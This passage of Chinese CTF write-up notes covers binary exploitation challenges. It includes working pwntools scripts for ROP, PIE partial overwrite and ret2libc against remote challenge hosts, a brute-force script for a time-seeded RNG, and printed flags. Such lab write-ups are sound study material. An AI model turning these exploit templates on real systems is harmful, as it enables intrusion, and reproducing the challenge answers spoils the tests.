p = remote("gz.imxbt.cn",20368)
elf = ELF("./我把她丢了")


offset = 0x70 + 8

system= elf.plt["system"]
ret = 0x000000000040101a
pop_rdi = 0x0000000000401196
bin_sh = 0x0000000000402008

print(hex(system))

payload = b'a'*(offset) + p64(pop_rdi)   +p64(bin_sh) + p64(ret)+ p64(system)

p.sendline(payload)

p.interactive()
```









### 没有 canary 我要死了!













# ACECTF

## !Underflow

```c
[*] 'C:\\Users\\26597\\Desktop\\exploit-me'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

IDA打开

```c
int print_flag()
{
  return printf("%s", "ACECTF{buff3r_0v3rfl3w}");
}
```

## jumPIEng

```c
C:\Users\26597>nc 34.131.133.224 12346
Main function address: 0x556dc188c1a9
```

nc连接

返回main函数的地址

 发现和附件main函数地址不同

猜测有偏移

多次连接发现main函数的地址一直在变

但始终都会与附件main函数保持固定偏移

比如0x556dc188c1a9 0x559be7ec11a9

结尾都是1a9

而附件main函数地址为11a9

在进行一般加减后发现想要重定向到某个函数就只改后四位（实际解题只用改后三位）

根据附件里函数

```c
.text:0000000000001262 ; __unwind {
.text:0000000000001262                 push    rbp
.text:0000000000001263                 mov     rbp, rsp
.text:0000000000001266                 sub     rsp, 60h
.text:000000000000126A                 mov     rax, fs:28h
.text:0000000000001273                 mov     [rbp+var_8], rax
.text:0000000000001277                 xor     eax, eax
.text:0000000000001279                 lea     rax, s          ; "Error: Could not locate 'flag.txt'"
.text:0000000000001280                 mov     rdi, rax        ; s
.text:0000000000001283                 call    _puts
.text:0000000000001288                 lea     rax, modes      ; "r"
.text:000000000000128F                 mov     rsi, rax        ; modes
.text:0000000000001292                 lea     rax, filename   ; "flag.txt"
.text:0000000000001299                 mov     rdi, rax        ; filename
.text:000000000000129C                 call    _fopen
.text:00000000000012A1                 mov     [rbp+stream], rax
.text:00000000000012A5                 cmp     [rbp+stream], 0
.text:00000000000012AA                 jnz     short loc_12BD
.text:00000000000012AC                 lea     rax, aRedirectionFai ; "Redirection failed."
.text:00000000000012B3                 mov     rdi, rax        ; s
.text:00000000000012B6                 call    _puts
.text:00000000000012BB                 jmp     short loc_12FE
.text:00000000000012BD ; ---------------------------------------------------------------------------
```

所以找到需要输入的后三位：262

连上根据实际main函数地址输入对应重定向的地址就好了

```c
nc 34.131.133.224 12346
Main function address: 0x556dc188c1a9
Enter a redirection address (e.g.- 0x33012a): 0x556dc188c262
0x556dc188c262
Redirecting to address 0x556dc188c262!
Error: Could not locate 'flag.txt'
Flag: ACECTF{57up1d_57up1d_h4rry}
```



## Running Out of Time

main函数：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  FILE *v4; // rax
  int v5; // eax
  char Buffer[44]; // [rsp+20h] [rbp-30h] BYREF
  int v8; // [rsp+4Ch] [rbp-4h]

  _main();
  v3 = time(0LL);
  srand(v3);
  v8 = rand() % 100;
  printf("Provide the correct value: ");
  v4 = __iob_func();
  fgets(Buffer, 32, v4);
  v5 = atoi(Buffer);
  if ( v5 == v8 )
    p3xr9q_t1zz();
  else
    puts("Incorrect. Please try again.");
  return 0;
}
```

p3xr9q_t1zz函数：

```c
int p3xr9q_t1zz()
{
  _BYTE v1[27]; // [rsp+20h] [rbp-20h]
  char v2; // [rsp+3Bh] [rbp-5h]
  unsigned int i; // [rsp+3Ch] [rbp-4h]

  v1[0] = 29;
  v1[1] = 27;
  v1[2] = 71;
  v1[3] = 25;
  v1[4] = 117;
  v1[5] = 31;
  v1[6] = 29;
  v1[7] = 26;
  v1[8] = 90;
  v1[9] = 90;
  v1[10] = 25;
  v1[11] = 78;
  v2 = 42;
  printf("Success! Here is your output: ");
  for ( i = 0; i <= 0xB; ++i )
    putchar(v2 ^ v1[i]);
  return putchar(10);
}
```

像伪随机漏洞

就是用当前时间戳作为种子来生成随机数

不过这个题没给连接

纯单机交互

直接让ai写个爆破脚本，随机数的值也不大

就0~99

所以只要运气足够好，就能秒出正确返回值

```python
import random
import subprocess

def main():
    # 目标程序的路径
    target_program_path = r"D:\python\pythonProject\Running_Out_Of_Time.exe"

    print("开始暴力破解...")
    while True:
        # 1. 生成随机数
        random_number = random.randint(0, 99)  # 假设随机数范围是 [0, 99]
        print(f"尝试随机数: {random_number}")

        # 2. 运行目标程序，并捕获其输出
        try:
            process = subprocess.Popen(
                [target_program_path],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=False
            )

            # 3. 将随机数输入到目标程序
            output, error = process.communicate(input=f"{random_number}\n", timeout=10)

            # 4. 检查目标程序的输出
            if "Success" in output or "success" in output:
                print(f"找到正确的随机数: {random_number}")
                print("目标程序回显内容:")
                print(output.strip())
                break
            else:
                print("目标程序输出:", output.strip())

        except Exception as e:
            print(f"运行目标程序时出错: {e}")
            break

if __name__ == "__main__":
    main()
```

运行结果：

```python
D:\python\pythonProject\.venv\Scripts\python.exe "D:\python\pythonProject\Running Out of Time.py" 
开始暴力破解...
尝试随机数: 99
找到正确的随机数: 99
目标程序回显内容:
Provide the correct value: Success! Here is your output: 71m3_570pp3d

进程已结束，退出代码为 0
```

拿到flag

**ACECTF{71m3_570pp3d}**

# GHCTF

## Welcome come to the world of PWN

这题可以和ACECTF中的PIE进行联动

ACECTF中的就是一个先导题

很遗憾没能第一时间意识到这俩实际上是一个考点

checksec

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\GHpwn1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

IDA打开

反编译结果很明显

main函数就执行两个主要函数

输出函数没什么好说的

全是put输出

func1函数里面存在很明显的栈溢出漏洞

```c
ssize_t func1()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  return read(0, buf, 0x40uLL);
}
```

很简单的栈溢出

看函数还能发现存在backdoor函数

直接给了

```c
int backdoor()
{
  return system("/bin/sh");
}
```

很明显了

一般情况就是溢出字符加后门函数地址就好了

但是存在PIE保护

PIE保护的效果是什么

参考ACECTF中PIE题目

PIE的存在让我们拿不到远程交互的函数实际地址，就没法完成提权操作

而内存分页机制存在问题：程序地址最后 `3` 个 `16` 进制位是不会改变的

这个地方可参考ACECTF，ACECTF对此做了很不错的引导

那倒回此处

溢出拿到

已知因为内存分页机制，程序地址后三位不变

而关键的backdoor函数地址

```c
.text:00000000000009C1 ; int backdoor()
.text:00000000000009C1                 public backdoor
.text:00000000000009C1 backdoor        proc near
.text:00000000000009C1 ; __unwind {
.text:00000000000009C1                 push    rbp
.text:00000000000009C2                 mov     rbp, rsp
.text:00000000000009C5                 lea     rdi, command    ; "/bin/sh"
.text:00000000000009CC                 call    _system
.text:00000000000009D1                 nop
.text:00000000000009D2                 pop     rbp
.text:00000000000009D3                 retn
.text:00000000000009D3 ; } // starts at 9C1
.text:00000000000009D3 backdoor        endp
```

为了能够使用p8方法，我们采用后两位，若采用后三位则会使p8方法报错

不知道是不是PIE都默认使用p8方法，日后再进行验证

exp：

```python
from pwn import *
p = remote('node6.anna.nssctf.cn',22606)
payload = b'a'*0x28 + p8(0xC5)
p.send(payload)
p.interactive()
```

## ret2libc1

```c
[*] 'C:\\Users\\26597\\Desktop\\ghpwn2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

直接填板子是不行的，没办法直接进行ret2libc

附件里面附带的函数很多

挨着逆向其逻辑

mian函数里面加载了菜单函数

通过switch语句进行选择项

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)read_count() )
    {
      case 1u:
        flower();
        break;
      case 2u:
        books();
        break;
      case 3u:
        hell_money();
        break;
      case 4u:
        clothing();
        break;
      case 5u:
        shop();
        break;
      case 6u:
        check_money();
        break;
      case 7u:
        see_it();
        break;
      default:
        puts("Invalid choose");
        break;
    }
  }
}
```

这里看到存在7个选项

但是在菜单函数中，只给出了6个puts内容对应前六个选项

```c
int menu()
{
  puts("Welcome to shop, what do you buy?");
  puts("1.flowers");
  puts("2.books");
  puts("3.hell money");
  puts("4.clothing");
  puts("5.buy my shop");
  return puts("6.check youer money");
}


```

所以第七个选项很明显是存在问题的

进入第七个选项对应的函数

__

```c
int64 see_it()
{
  __int64 result; // rax
  int count; // [rsp+Ch] [rbp-4h]

  puts("Barter?!1000$ = 1hell_money");
  printf("How much do you exchange?");
  count = read_count();
  what_can_I_say -= count;
  result = (unsigned int)(money + 1000 * count);
  money += 1000 * count;
  return result;
}
```

看得出来这里存在两种货币

money和hell_money

1hm = 1000m

然后在其他选项中，均是用m进行交易

hell_money也是可以通过money进行购买的

预期解应该是不断用 `money` 购买 `holl_money` 然后用 `holl_money` 购买 `money` 使得 `money` 能购买整个商店，然后 `ret2libc`

但是直接进入选项7换money，hell_money成负数也没关系，直接就能出

交互结果：

```powershell
Welcome to shop, what do you buy?
1.flowers
2.books
3.hell money
4.clothing
5.buy my shop
6.check youer money

6

you have 1000 $
you have 0 hell_money

Welcome to shop, what do you buy?
1.flowers
2.books
3.hell money
4.clothing
5.buy my shop
6.check youer money

7

Barter?!1000$ = 1hell_money
How much do you exchange?

1000000

Welcome to shop, what do you buy?
1.flowers
2.books
3.hell money
4.clothing
5.buy my shop
6.check youer money

6

you have 1000001000 $
you have -1000000 hell_money

Welcome to shop, what do you buy?
```

可以看到这里直接拿到了足够的money，但hell_money 直接成了负数

但是存在栈溢出漏洞的购买函数shop（）是只需要money的

也就是说，存在非预期解，直接换购money后直接进行ret2libc即可，不需要hm和m互相换购，也就是不需要过一遍选项三中的hell_money函数

exp:

```
from pwn import *


io = remote('node1.anna.nssctf.cn',28599)
# io=process("./pwn")
elf = ELF('./attachment')
libc= ELF('./libc.so.6')

io.sendline(b'7')
io.recv()
io.sendline(b'1000000')
io.recv()
io.sendline(b'5')

ret_add =0x0000000000400579
pop_rdi =0x0000000000400d73
main_add =0x0000000000400B1E
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x40

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendlineafter(b'it!!!', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

# libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

# libc_base = puts_addr - libc.dump('puts')
# system_add = libc_base + libc.dump('system')
# bin_sh_add = libc_base + libc.dump('str_bin_sh')

libc_base = puts_addr - libc.symbols['puts']
system_add = libc_base + libc.symbols['system']
bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'it!!!', payload2)

io.interactive()
```

# TGCTF（杭师大）

## 签到

板子ret2libc



## shellcode



## fmt





# ISCC

## 签

